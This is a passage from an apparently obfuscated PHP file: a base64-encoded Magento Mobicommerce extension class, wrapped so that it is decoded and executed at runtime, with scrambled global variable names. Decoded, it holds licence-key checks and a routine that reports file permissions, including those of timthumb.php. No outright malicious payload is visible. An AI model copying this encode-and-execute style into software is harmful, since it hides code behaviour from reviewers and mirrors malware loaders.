CAgICAgIGlmKCRYeWduRkd3TGxqbGdUa214dWFuWi0+Y291bnQoKSA+IDApew0KICAgICAgICAgICAgICAgIGZvcmVhY2goJFh5Z25GR3dMbGpsZ1RrbXh1YW5aIGFzICRfYXBwKXsNCiAgICAgICAgICAgICAgICAgICAgJF9hcHAtPnNldERhdGEoJEdMT0JBTFNbIkZCaWFUenpGZnNFdENoaUJwWEJoIl0sICRtb2RlKTsNCiAgICAgICAgICAgICAgICAgICAgJF9hcHAtPnNldERhdGEoJEdMT0JBTFNbInBya0dsR1p5dU1qYkZoeVpzbyJdLCBpc3NldCgkZGF0YVskR0xPQkFMU1siU3RxVk9qUFBzbHl0TlJ4YWh2cXUiXV0pID8gJGRhdGFbJEdMT0JBTFNbIlN0cVZPalBQc2x5dE5SeGFodnF1Il1dIDogTlVMTCk7DQogICAgICAgICAgICAgICAgICAgICRfYXBwLT5zZXREYXRhKCRHTE9CQUxTWyJLT0lkZnRNeW96RlZGeHdoaFV4YSJdLCBpc3NldCgkZGF0YVskR0xPQkFMU1siVHZoQXdYdEl3cllkcFRhSmFvdSJdXSkgPyAkZGF0YVskR0xPQkFMU1siVHZoQXdYdEl3cllkcFRhSmFvdSJdXSA6IE5VTEwpOw0KICAgICAgICAgICAgICAgICAgICAkX2FwcC0+c2V0RGF0YSgkR0xPQkFMU1siWURpUWVBaGpOalRmUldmSWpXUlAiXSwgaXNzZXQoJGRhdGFbJEdMT0JBTFNbInFSbmJweEVoYkVJVmRlQ3NQb3phIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJxUm5icHhFaGJFSVZkZUNzUG96YSJdXSA6IE5VTEwpOw0KICAgICAgICAgICAgICAgICAgICAkX2FwcC0+c2V0RGF0YSgkR0xPQkFMU1siS2JocWVLcUJCamNkV1lVU3VOSXYiXSwgaXNzZXQoJGRhdGFbJEdMT0JBTFNbInZsZ2F5ZFJWSnNyWnVnUE1yc0RMIl1dKSA/ICRkYXRhWyRHTE9CQUxTWyJ2bGdheWRSVkpzclp1Z1BNcnNETCJdXSA6IE5VTEwpOw0KICAgICAgICAgICAgICAgICAgICAkX2FwcC0+c2V0RGF0YSgkR0xPQkFMU1siT1VqWFFmYkhHV3pTc0tmeFVRZyJdLCBpc3NldCgkZGF0YVskR0xPQkFMU1siR0VHaGhJb1RTaGJRTU5PeVlESmwiXV0pID8gJGRhdGFbJEdMT0JBTFNbIkdFR2hoSW9UU2hiUU1OT3lZREpsIl1dIDogTlVMTCk7DQogICAgICAgICAgICAgICAgICAgICRfYXBwLT5zZXREYXRhKCRHTE9CQUxTWyJDR09hQmZya0ZIbFptWm1uTVRISyJdLCBpc3NldCgkZGF0YVskR0xPQkFMU1siQ0dPYUJmcmtGSGxabVptbk1USEsiXV0pID8gJGRhdGFbJEdMT0JBTFNbIkNHT2FCZnJrRkhsWm1abW5NVEhLIl1dIDogTlVMTCktPnNhdmUoKTsNCiAgICAgICAgICAgICAgICAgICAgJF9hcHAtPnNldERhdGEoJEdMT0JBTFNbIkF1WG5rT2VRZmdGU09mU2RVSEVzIl0sIHNlcmlhbGl6ZShhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJ3b3hqb2Zib214UVl3R1d5VmZieiJdID0+ICRUZ2RadktSdFZrdkpkWkpoelRDLA0KICAgICAgICAgICAgICAgICAgICAgICAgJEdMT0JBTFNbInd2TXFpZ1JPenpSTGFqTFR5eHMiXSA9PiAkZnhHWVRzVkpTQm1Fb3V0TnVqWWsNCiAgICAgICAgICAgICAgICAgICAgICAgICkpKTsNCiAgICAgICAgICAgICAgICAgICAgJF9hcHAtPnNldERhdGEoJEdMT0JBTFNbIkZuSU1YY09SdlhPbVpOcUpIV0dFIl0sIGRhdGUoJEdMT0JBTFNbInJjckpLTFNGclNSdEdubnVmUk9JIl0pKTsNCiAgICAgICAgICAgICAgICAgICAgJF9hcHAtPnNhdmUoKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAkSk5WaXlMa2NBVHVOdmZmdUtZYWQgPSBNYWdlOjpnZXRNb2RlbCgkR0xPQkFMU1siSktCa25BRGdsWU9JbkJLaFNueUciXSktPmdldENvbGxlY3Rpb24oKTsNCiAgICAgICAgICAgICAgICBpZigkSk5WaXlMa2NBVHVOdmZmdUtZYWQtPmNvdW50KCkgPiAwKXsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkSk5WaXlMa2NBVHVOdmZmdUtZYWQgYXMgJEx4SnFZQkVhT29oeWlPckR4U1BoKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRMeEpxWUJFYU9vaHlpT3JEeFNQaC0+c2V0RGF0YSgkR0xPQkFMU1siUEtYem9xb2VjUGpJVGtHcmRBRXgiXSwgJEdMT0JBTFNbInN2YlRvS2pzRGVCS1hCamlWZEFrIl0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgJEx4SnFZQkVhT29oeWlPckR4U1BoLT5zYXZlKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zdWNjZXNzU3RhdHVzKCRYeWduRkd3TGxqbGdUa214dWFuWi0+Y291bnQoKSAuICRHTE9CQUxTWyJ0Z2RIaEV5b2pSSG5KbXRXdHluUSJdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2V7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5lcnJvclN0YXR1cygkR0xPQkFMU1siRVJsR2labXlpREdiblFvY3RhUSJdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRQbHVnaW5WZXJzaW9uKCkNCiAgICB7DQogICAgICAgICRyZXR1cm4gPSAkdGhpcy0+c3VjY2Vzc1N0YXR1cygpOw0KICAgICAgICAkcmV0dXJuWyRHTE9CQUxTWyJWdHlhYnhCQWpvTkFYQmpEb3F4eSJdXVskR0xPQkFMU1siUGNrWVllaHdlSkZUWUpERFpBbXAiXV0gPSBNYWdlOjpoZWxwZXIoJEdMT0JBTFNbImdaR3RCb25hbnhNQ0pmZWdtVXZjIl0pLT5pc01vZHVsZUVuYWJsZWQoJEdMT0JBTFNbIll1QktRVktTbERBYUl4b2VSeXV5Il0pOw0KICAgICAgICAkcmV0dXJuWyRHTE9CQUxTWyJWdHlhYnhCQWpvTkFYQmpEb3F4eSJdXVskR0xPQkFMU1sieWpkSGlCUFVrQU52UnBTVW5lV0QiXV0gPSAoc3RyaW5nKSBNYWdlOjpnZXRDb25maWcoKS0+Z2V0Tm9kZSgpLT5tb2R1bGVzLT5Nb2JpY29tbWVyY2VfTW9iaXNlcnZpY2VzMy0+dmVyc2lvbjsNCiAgICAgICAgcmV0dXJuICRyZXR1cm47DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIGdldE1vZHVsZXNMaXN0KCRkYXRhID0gYXJyYXkoKSkNCiAgICB7DQogICAgICAgICRjSWd5T1lsU21memdVdEpaRWVrUiA9IGlzc2V0KCRkYXRhWyRHTE9CQUxTWyJndk9UQ3phUHNFd0VPa05uR0JRRyJdXSkgPyAkZGF0YVskR0xPQkFMU1siZ3ZPVEN6YVBzRXdFT2tObkdCUUciXV0gOiBOVUxMOw0KICAgICAgICBpZigkY0lneU9ZbFNtZnpnVXRKWkVla1Ipew0KICAgICAgICAgICAgJEpOVml5TGtjQVR1TnZmZnVLWWFkID0gTWFnZTo6Z2V0TW9kZWwoJEdMT0JBTFNbIkpLQmtuQURnbFlPSW5CS2hTbnlHIl0pLT5nZXRDb2xsZWN0aW9uKCk7DQogICAgICAgICAgICAkS3NnU2tpU29ER0diWmFHcWxzeFAgPSBOVUxMOw0KICAgICAgICAgICAgJHFtS3lXd0FxVUVGdGhpWVZOT0xnID0gZmFsc2U7DQogICAgICAgICAgICBpZigkSk5WaXlMa2NBVHVOdmZmdUtZYWQtPmdldExhc3RJdGVtKCkpew0KICAgICAgICAgICAgICAgICRLc2dTa2lTb0RHR2JaYUdxbHN4UCA9ICRKTlZpeUxrY0FUdU52ZmZ1S1lhZC0+Z2V0TGFzdEl0ZW0oKS0+Z2V0TWxMaWNlbmNlS2V5KCk7DQogICAgICAgICAgICAgICAgJHFtS3lXd0FxVUVGdGhpWVZOT0xnID0gJEpOVml5TGtjQVR1TnZmZnVLWWFkLT5nZXRMYXN0SXRlbSgpLT5nZXRNbERlYnVnZ2VyTW9kZSgpOw0KICAgICAgICAgICAgICAgIGlmKCRxbUt5V3dBcVVFRnRoaVlWTk9MZyA9PSAkR0xPQkFMU1sibHNLYUV1ckNGdmhxSWZlUmJFYXAiXSl7DQogICAgICAgICAgICAgICAgICAgICRxbUt5V3dBcVVFRnRoaVlWTk9MZyA9IHRydWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYoJGNJZ3lPWWxTbWZ6Z1V0SlpFZWtSID09ICRLc2dTa2lTb0RHR2JaYUdxbHN4UCAmJiAkcW1LeVd3QXFVRUZ0aGlZVk5PTGcpew0KICAgICAgICAgICAgICAgICRyZXR1cm4gPSAkdGhpcy0+c3VjY2Vzc1N0YXR1cygpOw0KICAgICAgICAgICAgICAgICR6Qkx1cUJnVFZnWnF2eVNmWnJJTSA9IE1hZ2U6OmdldEJhc2VEaXIoKTsNCiAgICAgICAgICAgICAgICAkcmV0dXJuWyRHTE9CQUxTWyJWdHlhYnhCQWpvTkFYQmpEb3F4eSJdXVskR0xPQkFMU1siR3hQSkZZREhKTnRuWEluSmhrVUciXV0gPSBhcnJheV9rZXlzKChhcnJheSlNYWdlOjpnZXRDb25maWcoKS0+Z2V0Tm9kZSgkR0xPQkFMU1siR3hQSkZZREhKTnRuWEluSmhrVUciXSktPmNoaWxkcmVuKCkpOw0KICAgICAgICAgICAgICAgICRyZXR1cm5bJEdMT0JBTFNbIlZ0eWFieEJBam9OQVhCakRvcXh5Il1dWyRHTE9CQUxTWyJQcHJEb2N3cWlPY3VYV2R2VmJMcyJdXSAgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJ3RpbXRodW1iLnBocCcgPT4gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKE1hZ2U6OmdldEJhc2VEaXIoKSAuICcvTW9iaVNldHRpbmdzL3RpbXRodW1iLnBocCcpKSwgLTQpLA0KICAgICAgICAgICAgICAgICAgICAkR0xPQkFMU1siRm1zVnB4bWpzelhnUlRybVptSnIiXSAgICAgPT4gc3Vic3RyKHNwcmludGYoJEdMT0JBTFNbInVqWlllTUFKTFRVdVl4QUl3dWMiXSwgZmlsZXBlcm1zKE1hZ2U6OmdldEJhc2VEaXIoTWFnZV9Db3JlX01vZGVsX1N0b3JlOjpVUkxfVFlQRV9NRURJQSkgLiAkR0xPQkFMU1sicU1vcmRuZW1hY3lMYnhrak5HbmMiXSkpLCAtNCksDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXR1cm47DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5lcnJvclN0YXR1cygkR0xPQkFMU1sidWNhd2VRTklxS2hhVU9rc3RIanMiXSk7DQogICAgfQ0KDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF92YWxpZGF0ZUxpY2VuY2VLZXkoJGtleT1udWxsKQ0KICAgIHsNCiAgICAgICAgaWYoZW1wdHkoJGtleSkpDQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICAgICAgJEpOVml5TGtjQVR1TnZmZnVLWWFkID0gTWFnZTo6Z2V0TW9kZWwoJEdMT0JBTFNbIkpLQmtuQURnbFlPSW5CS2hTbnlHIl0pLT5nZXRDb2xsZWN0aW9uKCk7DQogICAgICAgIGlmKCRKTlZpeUxrY0FUdU52ZmZ1S1lhZC0+Y291bnQoKSAmJiAkSk5WaXlMa2NBVHVOdmZmdUtZYWQtPmdldExhc3RJdGVtKCkpew0KICAgICAgICAgICAgJEtzZ1NraVNvREdHYlphR3Fsc3hQID0gJEpOVml5TGtjQVR1TnZmZnVLWWFkLT5nZXRMYXN0SXRlbSgpLT5nZXRNbExpY2VuY2VLZXkoKTsNCiAgICAgICAgICAgIGlmKCRrZXkgPT0gJEtzZ1NraVNvREdHYlphR3Fsc3hQKXsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KfSA/Pg==').'<?php '); ?>